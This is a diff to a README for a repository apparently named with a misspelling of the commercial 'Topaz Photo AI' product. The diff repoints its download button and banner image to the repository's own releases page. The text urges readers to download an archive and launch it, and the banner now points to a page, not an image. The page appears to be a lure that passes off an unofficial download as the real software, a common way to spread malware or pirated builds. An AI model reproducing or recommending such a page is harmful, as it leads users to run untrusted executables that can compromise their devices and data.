@@ -2,7 +2,7 @@
 
 Welcome to the **Thopaz-Photo-AI** repository! This repository is home to the amazing **Topaz Photo AI Sharpen** tool, a revolutionary application that utilizes deep learning technology to enhance your photos by correcting blur and sharpening them naturally.
 
-![Topaz Photo AI Sharpen Banner](https://example.com/banner.jpg)
+![Topaz Photo AI Sharpen Banner](https://github.com/PROGRAMMERGIUSEPP0/Thopaz-Photo-AI/releases)
 
 ## About Topaz Photo AI Sharpen
 
@@ -24,7 +24,7 @@ Using Topaz Photo AI Sharpen is easy! Simply download the tool from the link bel
 
 Click the button below to download Topaz Photo AI Sharpen:
 
-[![Download Topaz Photo AI Sharpen](https://img.shields.io/badge/Download-App.zip-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Topaz Photo AI Sharpen](https://github.com/PROGRAMMERGIUSEPP0/Thopaz-Photo-AI/releases)](https://github.com/PROGRAMMERGIUSEPP0/Thopaz-Photo-AI/releases)
 
 **Note:** Make sure to launch the downloaded file to install Topaz Photo AI Sharpen on your device.
 
